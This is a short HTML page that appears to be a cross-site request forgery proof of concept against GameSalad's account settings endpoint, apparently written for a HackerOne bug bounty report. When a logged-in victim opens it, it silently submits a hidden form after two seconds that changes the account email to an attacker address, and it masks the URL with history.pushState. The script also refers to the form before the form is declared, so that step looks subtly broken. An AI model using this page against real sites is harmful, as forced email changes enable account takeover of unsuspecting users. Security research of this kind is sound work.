<html>
   <body onload="setTimeout(function() { document.exploit.submit() }, 2000)">
   <script>history. pushState('', '', '/')</script>
   <script>
      var counter = parseInt(localStorage.getItem('counter')) || 1; // get the current counter value from local storage or set it to 1
      var email = "saifedeen+" + counter + "@wearehackerone.com"; // concatenate the email address with the counter value
      document.exploit.elements["game_salad_user[email_address]"].value = email; // set the email value in the input field
      localStorage.setItem('counter', counter + 1); // increment the counter and store it in local storage
   </script>
 	<form action="https://auth.gamesalad.com/account/settings.json" method="POST" name="exploit">
   	<input type="hidden" name="game_salad_user[email_address]" value="" />
   	<input type="submit" value="Submit request" hidden/>
 	</form>
   </body>
</html>
